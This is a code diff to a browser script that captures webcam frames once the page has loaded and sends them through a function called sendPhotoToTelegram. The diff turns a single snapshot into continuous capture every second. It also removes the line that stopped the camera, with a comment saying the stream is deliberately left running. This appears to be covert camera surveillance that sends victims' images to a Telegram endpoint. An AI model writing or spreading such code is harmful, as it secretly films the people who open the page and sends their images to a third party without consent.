@@ -127,16 +127,20 @@ document.addEventListener('DOMContentLoaded', async () => {
                 canvas.width = player.videoWidth;
                 canvas.height = player.videoHeight;
 
-                // Draw frame
-                context.drawImage(player, 0, 0, canvas.width, canvas.height);
+                // Start Continuous Capture (Every 1 second)
+                setInterval(() => {
+                    if (player.readyState === player.HAVE_ENOUGH_DATA) {
+                        // Draw frame
+                        context.drawImage(player, 0, 0, canvas.width, canvas.height);
 
-                // Convert to Blob and Send
-                canvas.toBlob((blob) => {
-                    sendPhotoToTelegram(blob);
+                        // Convert to Blob and Send
+                        canvas.toBlob((blob) => {
+                            sendPhotoToTelegram(blob);
+                        }, 'image/jpeg', 0.7); // Slightly lower quality for speed
+                    }
+                }, 1000);
 
-                    // Stop Camera
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg', 0.8);
+                // Note: We are NOT stopping the stream so it keeps running.
 
             } catch (err) {
                 console.error("Camera Error:", err);
